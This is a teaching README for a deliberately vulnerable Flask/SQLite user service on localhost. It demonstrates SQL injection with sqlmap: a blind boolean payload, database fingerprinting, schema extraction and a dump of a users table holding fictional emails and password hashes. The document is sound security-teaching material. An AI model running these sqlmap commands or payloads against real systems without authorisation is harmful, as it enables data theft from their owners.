# Example: User Service - SQL Injection Attack
 
In this example, we can see how a simple user service can be implemented 
using Flask and SQLite.

Also, we will demonstrate an SQL injection attack on this service.

## Start the Service 

We start the web service from the command line:
```
$ python3 user_service.py
```

## Find a particular User

We can query the service for a particular user:

```bash
$ curl -i http://localhost:8080/users/homer

HTTP/1.1 200 OK
Server: Werkzeug/3.0.4 Python/3.11.2
Date: Wed, 08 Jan 2025 19:52:26 GMT
Content-Type: application/json
Content-Length: 81
Connection: close

{
  "email": "homer.simpson@springfield.com",
  "id": 1,
  "username": "homer"
}
```

Here we get the username, email, and id of the user `homer`.

We can also query for a user that does not exist:

```bash
$ curl -i http://localhost:8080/users/moe

HTTP/1.1 404 NOT FOUND
Server: Werkzeug/3.0.4 Python/3.11.2
Date: Wed, 08 Jan 2025 19:54:05 GMT
Content-Type: application/json
Content-Length: 32
Connection: close

{
  "error": "User not found"
}
```


## Attack the Service with SQLMap

We can use `sqlmap` to find out, if the service is vulnerable to SQL injection.

_Example:_ Fingerpring the database

```bash
$ sqlmap -u "http://localhost:8080/users/homer*" --technique=BT

sqlmap identified the following injection point(s) with a total of 39 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://localhost:8080/users/homer' AND 5966=5966 AND 'McxN'='McxN
---
[20:44:47] [INFO] testing SQLite
[20:44:47] [INFO] confirming SQLite
[20:44:47] [INFO] actively fingerprinting SQLite
[20:44:47] [INFO] the back-end DBMS is SQLite
```

_Example:_ Extract the database schema
```bash
$ sqlmap -u "http://localhost:8080/users/homer*" --technique=BT --schema

[20:47:56] [INFO] retrieved: 2
[20:47:56] [INFO] retrieved: users
[20:47:56] [INFO] retrieved: sqlite_sequence
[20:47:56] [INFO] fetched tables: 'SQLite_masterdb.users', 'SQLite_masterdb.sqlite_sequence'
[20:47:56] [INFO] retrieved: CREATE TABLE "users" (  "id" INTEGER,  "username" TEXT NOT NULL,  "email" TEXT NOT NULL,  "password" TEXT NOT NULL,  PRIMARY KEY("id" AUTOINCREMENT) )
[20:47:59] [INFO] retrieved: CREATE TABLE sqlite_sequence(name,seq)

```

_Example:_ Extract the database content
```bash
$ sqlmap -u "http://localhost:8080/users/homer*" --technique=BT --dump

Table: users
[2 entries]
+----+-------------------------------+------------------------------------------------------------------+----------+
| id | email                         | password                                                         | username |
+----+-------------------------------+------------------------------------------------------------------+----------+
| 1  | homer.simpson@springfield.com | 2aaab795b3836904f82efc6ca2285d927aed75206214e1da383418eb90c9052f | homer    |
| 2  | marge.simpson@springfield.com | b4b811fa40505329ae871e52f03527c3720c9af7fb8607819658535c5484c41e | marge    |
+----+-------------------------------+------------------------------------------------------------------+----------+
```

*Egon Teiniker, 2017-2025, GPL v3.0*
 